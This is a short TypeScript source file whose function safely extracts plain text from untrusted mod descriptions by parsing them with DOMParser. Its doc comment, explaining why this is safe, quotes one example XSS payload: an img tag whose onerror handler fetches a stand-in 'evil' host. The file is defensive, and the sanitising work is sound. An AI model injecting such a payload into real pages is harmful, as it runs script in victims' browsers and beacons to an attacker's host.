/**
 * Extract plain text from untrusted HTML (e.g. remote mod/modpack
 * descriptions from Modrinth / CurseForge).
 *
 * Uses `DOMParser`, which builds an INERT document: unlike assigning to
 * `innerHTML` on a live (even detached) element, it does NOT load
 * resources or fire inline event handlers, so a payload like
 * `<img src=x onerror=fetch('//evil')>` cannot execute or beacon out.
 */
export function htmlToText(html: string): string {
  return new DOMParser().parseFromString(html ?? '', 'text/html').body.textContent ?? ''
}
